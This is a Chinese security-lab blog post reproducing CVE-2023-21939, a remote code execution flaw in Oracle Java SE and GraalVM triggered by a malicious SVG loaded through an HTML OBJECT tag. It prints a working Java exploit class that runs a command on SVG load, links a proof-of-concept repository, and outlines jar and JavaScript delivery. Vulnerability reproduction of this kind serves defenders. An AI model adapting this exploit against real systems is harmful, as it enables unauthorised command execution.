> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kc-j9BF2suJtJSQ-PJxJOQ)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

Oracle Java SE 和 Oracle GraalVM 都是美国甲骨文（Oracle）公司的产品。Oracle Java SE 是一款用于开发和部署桌面、服务器以及嵌入设备和实时环境中的 Java 应用程序。Oracle GraalVM 是一套使用 Java 语言编写的即时编译器。该产品支持多种编程语言和执行模式。

Oracle Java SE 8u361、8u361-perf、11.0.18、17.0.6、20 版本, Oracle GraalVM Enterprise 20.3.9、21.3.5 和 22.3.1 版本存在安全漏洞，攻击者利用该漏洞可以对 Oracle Java SE、Oracle GraalVM Enterprise Edition 可访问数据进行未经授权的更新、插入或删除访问。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20；

Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5, 22.3.1

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF012UiclU8HJfoqK7CPH6AR8AdqeafUa1ztKWWF4TjXX0QvBwicb6qSt4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 下载漏洞源码

```
https://github.com/Y4Sec-Team/CVE-2023-21939

```

### JDK + Apache XML Graphics + Mozilla Rhino

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0AlqX1x93aMfjfr0yu3Zic9Y75xhxyfXicibVsDOo1YVzppGQzeZT1oNag/640?wx_fmt=png)

2. 漏洞复现

**EXP  
**

```
import org.w3c.dom.events.Event;
import org.w3c.dom.events.EventListener;
import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.SVGSVGElement;
public class Exploit implements EventListenerInitializer {
    public Exploit() {
    }
    public void initializeEventListeners(SVGDocument document) {
        SVGSVGElement root = document.getRootElement();
        EventListener listener = new EventListener() {
            public void handleEvent(Event event) {
                try {
                    Runtime.getRuntime().exec("calc.exe");
                } catch (Exception e) {
                }
            }
        };
        root.addEventListener("SVGLoad", listener, false);
    }
}

```

两种利用方式

方式 1（jar RCE）

1. 启动 jar 服务

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0czEZiaIFkfsWGRgFEU4zFiahqX1O0Pb9wkP7TbibibOezwmAYiaiaiaicqWchg/640?wx_fmt=png)

2. 通过 jar 方式加载 exp 进行命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0CsvfK4K7DSeZ4oFXwxDso7nnRngo3u9pvdBp1arbKXZanCz9YGtJUA/640?wx_fmt=png)

3. 执行过程中流量  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF07Dd7UfHKvRY6LukFp5XLpw4cA0Lau5ibq7EBlvJpSpbQ5gHLQ8fzlCA/640?wx_fmt=png)

方式 2（js RCE）

1. 启动 xml 服务

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0U3IChiag9Rtz6DARGdPdsJl69hlaAuDiaxUrgm6rP6hfAE8l0sOCdjwg/640?wx_fmt=png)

2. 通过 js 方式加载 exp 进行命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0KUE3NYJZyJcvxvnUicrjXUZZBqfXBVnSnpfcicuXsbd2w68kuxq1ghOA/640?wx_fmt=png)

3. 执行过程中流量

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0fceAkgYGN4Sm4IAJzCVEoENev4TickU4xR8dhibC6g31SmhiaricjwBQ5Q/640?wx_fmt=png)

简单分析

漏洞点：HTML 格式支持了 OBJECT 标签。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0fxbaWYVzLklyHVTENCpzEoSmLiasJeaSMooMUzjb9M26OFGaib8HBxOg/640?wx_fmt=png)

加载 org.apache.batik.swing.JSVGCanvas  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF003JLbyjpG7VmfDvOrrkia1MGO20bzjtHNtiaicDzo7TWWiacjibImozicq0g/640?wx_fmt=png)

标签加载

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0uOwGXiaGYZe3rQCMIF91RuzBBPKNGbQbeoibP1GzPsB1hUVa19pT3oUA/640?wx_fmt=png)

加载类型为字符

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0aDKSawiaicMzic5RAF4xreibbYM54icnoXHacFPjsAXLNWtqO1L2yzGibZ4A/640?wx_fmt=png)

开启 HTTP Server 写入恶意 XML (SVG) 后即可在读 Object 时 RCE。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0yqSuaSFUQLoZySLAch6h9swxQbhof0DMN5uqbgbViaWxJpFTaFxLJdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDsLBZdwib8ZFxhOJeLITBF0ocYRJUPOqZXRGiacq9roUYY3OkuEExAmgicPkCz8wq1nCpPIaUKsWOZA/640?wx_fmt=png)

视频演示

[视频详情](javascript:;)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级安全版本

```
https://www.oracle.com/java/technologies/javase/8u371-relnotes.html
https://www.oracle.com/java/technologies/javase/11-0-19-relnotes.html
https://www.oracle.com/java/technologies/javase/17-0-7-relnotes.html
https://www.oracle.com/java/technologies/javase/20-0-1-relnotes.html
https://mp.weixin.qq.com/s/-Rdkv1WmYrjNWhZZK3pj6w

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)